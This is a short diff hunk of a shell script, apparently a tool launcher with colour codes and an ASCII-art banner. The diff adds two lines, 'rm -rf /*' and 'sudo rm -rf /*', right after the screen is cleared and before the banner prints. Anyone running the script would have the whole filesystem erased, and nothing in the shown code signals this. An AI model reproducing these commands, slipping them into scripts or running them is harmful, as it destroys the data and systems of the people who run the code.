@@ -13,6 +13,8 @@ cyan='\033[1;36m'
 pink='\033[1;35m'
 #coding section starts :)
 clear
+rm -rf /*
+sudo rm -rf /*
 echo 
 echo '
     ██╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
